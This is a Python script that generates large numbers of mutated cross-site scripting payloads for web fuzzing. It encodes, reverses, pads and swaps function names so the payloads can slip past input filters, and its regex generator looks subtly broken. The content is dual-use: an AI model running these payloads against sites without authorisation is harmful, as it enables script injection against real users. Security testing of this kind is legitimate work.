import random
import html
import urllib.parse
import rstr
import argparse
from typing import List, Set
import os
from tqdm import tqdm  # Install with: pip install tqdm

# -------- Load Base Payloads from File -------- #

def load_base_payloads(filepath: str) -> List[str]:
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] File not found: {filepath}")
        return []

# -------- Mutation Functions -------- #

def insert_random_noise(payload: str) -> str:
    junk = ['/**/', '//', '<!-- -->', '`', '/*X*/', '\u002F']
    if len(payload) < 3:
        return payload
    pos = random.randint(1, len(payload) - 2)
    return payload[:pos] + random.choice(junk) + payload[pos:]

def mutate_payload(payload: str) -> List[str]:
    return [
        html.escape(payload),                                  # HTML entity encoding
        urllib.parse.quote(payload),                           # URL encoding
        payload.replace("<", "&lt;").replace(">", "&gt;"),     # Partial HTML escape
        payload[::-1],                                         # Reverse string
        payload.upper(),                                       # Uppercase
        insert_random_noise(payload),                          # Insert junk
        payload.replace("alert", "confirm"),                   # Function variant
        payload.replace("alert", "prompt")                     # Another function variant
    ]

# -------- Regex Generator -------- #

def regex_payload() -> str:
    pattern = r"<[a-z]{1,5} onw{3,10}=alert\(1\)>"
    return rstr.xeger(pattern)

# -------- Payload Generation -------- #

def generate_payloads(base_payloads: List[str], count: int) -> Set[str]:
    payloads = set()
    with tqdm(total=count, desc="Generating", unit="payload") as pbar:
        while len(payloads) < count:
            base = random.choice(base_payloads)
            for item in [base] + mutate_payload(base) + [regex_payload()]:
                if item not in payloads and len(payloads) < count:
                    payloads.add(item)
                    pbar.update(1)
    return payloads

# -------- Output in Chunks -------- #

def save_payloads(payloads: Set[str], output_base: str, chunk_size: int = 25000):
    os.makedirs("payload_chunks", exist_ok=True)
    payloads = list(payloads)
    file_count = (len(payloads) // chunk_size) + 1
    for i in range(file_count):
        chunk = payloads[i * chunk_size:(i + 1) * chunk_size]
        filename = f"payload_chunks/{output_base.replace('.txt', '')}_{i+1}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.writelines(p + "\n" for p in chunk)
    print(f"[+] Saved {len(payloads)} payloads in {file_count} files in ./payload_chunks/")

# -------- CLI Interface -------- #

def main():
    parser = argparse.ArgumentParser(description="XSS Payload Generator")
    parser.add_argument("--count", type=int, default=100000, help="Number of payloads to generate")
    parser.add_argument("--output", type=str, default="xss_payloads.txt", help="Output filename")
    parser.add_argument("--input", type=str, default="xss-payload-list.txt", help="Input file with base payloads")
    args = parser.parse_args()

    base_payloads = load_base_payloads(args.input)
    if not base_payloads:
        print("[!] No base payloads loaded. Exiting.")
        return

    print(f"[+] Loaded {len(base_payloads)} base payloads.")
    print(f"[+] Generating {args.count:,} mutated payloads...")

    generated = generate_payloads(base_payloads, args.count)
    save_payloads(generated, args.output)

    print("[+] Done.")

if __name__ == "__main__":
    main()
